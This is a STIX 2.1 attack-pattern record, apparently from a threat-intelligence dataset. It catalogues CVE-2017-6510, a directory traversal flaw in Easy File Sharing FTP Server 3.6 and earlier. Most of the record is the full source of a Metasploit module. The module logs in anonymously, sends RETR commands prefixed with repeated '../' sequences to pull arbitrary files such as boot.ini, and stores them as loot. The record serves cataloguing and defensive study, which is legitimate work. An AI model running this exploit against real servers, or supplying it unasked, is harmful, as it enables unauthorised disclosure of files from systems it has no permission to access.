{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--caa666e7-6b90-4b34-871a-414f9fc34a0a",
    "created": "2024-08-14T16:28:17.472252Z",
    "modified": "2024-08-14T16:28:17.472255Z",
    "name": "Easy File Sharing FTP Server 3.6 Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability found in Easy File Sharing FTP Server Version 3.6 and Earlier. This vulnerability allows an attacker to download arbitrary files from the server by crafting a RETR command that includes file system traversal strings such as '../'  'Platform'       => 'win'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ftp/easy_file_sharing_ftp.rb",
            "external_id": "easy_file_sharing_ftp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6510"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Easy File Sharing FTP Server 3.6 Directory Traversal',\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability found in Easy File Sharing FTP Server Version 3.6 and Earlier.\n        This vulnerability allows an attacker to download arbitrary files from the server by crafting\n        a RETR command that includes file system traversal strings such as '../'\n      },\n      'Platform'       => 'win',\n      'Author'         =>\n        [\n          'Ahmed Elhady Mohamed'   # @kingasmk ahmed.elhady.mohamed[at]gmail.com\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2017-6510']\n        ],\n      'DisclosureDate' => '2017-03-07'\n    ))\n\n    register_options(\n      [\n        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 32 ]),\n        OptString.new('PATH', [ true, \"Path to the file to disclose, relative to the root dir.\", 'boot.ini'])\n      ])\n  end\n\n  def check_host(ip)\n    begin\n      connect\n      if /Easy File Sharing FTP Server/i === banner\n        return Exploit::CheckCode::Detected\n      end\n    ensure\n      disconnect\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def run_host(target_host)\n    begin\n      # Login anonymously and open the socket that we'll use for data retrieval.\n      connect_login\n      sock = data_connect\n      if sock.nil?\n        error_msg = 'data_connect failed; posssible invalid response'\n        print_status(error_msg)\n        elog(error_msg)\n      else\n        file_path = datastore['PATH']\n        file = ::File.basename(file_path)\n\n        # make RETR request and store server response message...\n        retr_cmd = ( \"../\" * datastore['DEPTH'] ) + \"#{file_path}\"\n        res = send_cmd( [\"RETR\", retr_cmd])\n\n        # read the file data from the socket that we opened\n        # dont assume theres still a sock to read from. Per #7582\n        if sock.nil?\n          error_msg = 'data_connect failed; posssible invalid response'\n          print_status(error_msg)\n          elog(error_msg)\n          return\n        else\n          # read the file data from the socket that we opened\n          response_data = sock.read(1024)\n        end\n\n        unless response_data\n          print_error(\"#{file_path} not found\")\n          return\n        end\n\n        if response_data.length == 0 or ! (res =~ /^150/ )\n          print_status(\"File (#{file_path})from #{peer} is empty...\")\n          return\n        end\n\n        # store file data to loot\n        loot_file = store_loot(\"easy.file.sharing.ftp.data\", \"text\", rhost, response_data, file, file_path)\n        vprint_status(\"Data returned:\\n\")\n        vprint_line(response_data)\n        print_good(\"Stored #{file_path} to #{loot_file}\")\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e\n      vprint_error(e.message)\n      elog(e)\n    rescue ::Timeout::Error, ::Errno::EPIPE => e\n      vprint_error(e.message)\n      elog(e)\n    ensure\n      data_disconnect\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-07"
}